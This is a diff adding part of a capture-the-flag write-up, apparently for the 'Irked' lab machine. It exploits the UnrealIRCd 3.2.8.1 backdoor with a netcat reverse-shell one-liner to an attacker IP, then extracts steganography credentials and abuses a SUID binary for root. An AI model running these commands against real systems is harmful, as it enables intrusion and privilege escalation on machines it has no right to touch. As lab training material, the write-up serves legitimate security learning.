@@ -104,5 +104,57 @@ Only to find they are using version 3.2.8.1
 
 Google UnrealIRCd v3.2.8.1 and find that there is a very famous backdoor for this version of the software. 
 
+The exploit works like so: Issue a command but start with AB
+AB; whois for example.
+
+Let's try something other than that:
+echo 'AB; sh -i >& /dev/tcp/10.10.12.181/4444 0>&1' | nc 10.10.10.117 65534
+
+set up a net cat listener and issue the command to get the webshell:
+<img width="980" height="108" alt="image" src="https://github.com/user-attachments/assets/4212a2e6-d63c-412c-9ec7-7080f1b4f650" />
+
+/etc/passwd shows us the real user djmardov:
+<img width="545" height="59" alt="image" src="https://github.com/user-attachments/assets/4c4c3c8b-8d60-4586-a0bb-9d7707560cb1" />
+
+Enumeration on his /home/Documents folder shows this to us:
+<img width="864" height="200" alt="image" src="https://github.com/user-attachments/assets/eb6a374f-f18b-4d78-a433-6385fb0b04a8" />
+
+"Super elite steg backup pw" Hints at a image that contains secrets inside it hidden using steganography "UPupDOWNdownLRlrBAbaSSss" seems to be the password.
+
+DO you remember the picture at the website, let's try it:
+first we curl the website to know the name of the image:
+<img width="750" height="112" alt="image" src="https://github.com/user-attachments/assets/2c0b009e-e1ac-4ca7-92de-e3c94e7569e1" />
+
+Then user curl to download the image:
+<img width="1174" height="168" alt="image" src="https://github.com/user-attachments/assets/84732e91-b163-4a21-b92e-10979a67f227" />
+
+
+then we use steghide and the password to extract the credential from the image:
+<img width="773" height="184" alt="image" src="https://github.com/user-attachments/assets/ca739788-1a63-4c5f-b9c1-cddfc136bd9b" />
+
+ssh into djmardov:
+<img width="1138" height="249" alt="image" src="https://github.com/user-attachments/assets/bb5d9ab0-96ee-4360-b3f7-1343e8cf1cbb" />
+
+PRIVESC
+Very easy use the command to find processesses that run with SUID:
+djmardov@irked:~$ find / -user root -perm -4000 -exec ls -ldb {} \; > /tmp/ckprm
+Then cat the resulting file:
+<img width="1064" height="370" alt="image" src="https://github.com/user-attachments/assets/37721509-c479-4dab-9908-706f2ca5e13b" />
+
+The non default option is viewuser, execute it to see that he takes a file /tmp/listusers:
+<img width="652" height="103" alt="image" src="https://github.com/user-attachments/assets/783b0855-0e55-4326-9031-a9fb93c4c9e0" />
+
+Just simply construct a file named /tmp/listusers with echo or nano:
+echo "sh" > /tmp/listusers, execute it and get root:
+<img width="691" height="189" alt="image" src="https://github.com/user-attachments/assets/c2994435-4813-40a2-b28c-06807f9cb019" />
+
+
+
+
+
+
+
+
+
 
 
